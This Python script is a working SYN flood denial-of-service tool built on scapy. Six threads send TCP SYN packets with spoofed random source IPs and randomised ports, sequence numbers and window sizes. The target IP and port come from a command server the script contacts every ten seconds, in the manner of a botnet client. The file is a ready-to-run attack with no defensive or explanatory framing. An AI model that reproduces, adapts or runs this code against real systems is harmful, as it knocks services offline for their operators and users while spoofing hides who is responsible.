from os import system
from sys import stdout
from scapy.all import *
from random import randint
import threading
import socket 
from datetime import datetime


def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood():
	total = 0
	
	dstIP = 0
	dstPort = 0
	backupIP = 0
	backupPort = 0
	while(True):
		
		now = datetime.now()

		if(now.second % 10 == 0 or total == 0):
			try:
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				client.connect(("127.0.0.1", 8181)) #Your server's ip and port
				attackIP = client.recv(200) # Get the ip you want to attack
				attackIP = attackIP.decode()
				print(attackIP)
				dstIP = attackIP
				client.send(attackIP.encode()) #Return the ip to your server
				attackPort = client.recv(200).decode() # Get the port you want to attack
				print(attackPort)
				dstPort = int(attackPort)
				client.send(attackPort.encode())
				backupIP = attackIP
				backupPort = int(attackPort)
				client.close()
			except Exception as e:
				dstIP = backupIP
				dstPort = backupPort
				print("The error is :",e)

		s_port = randInt() # Random the port
		s_eq = randInt() #Random the seq
		w_indow = randInt() #Random the window

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1


numberOfThreads = 6

def main():
	#dstIP,dstPort = info()
	
	threads = []
	

	for i in range(0,numberOfThreads):
		threads.append(threading.Thread(target=SYN_Flood, args=()))
		threads[i].start()
		
if __name__ == '__main__':
	main()
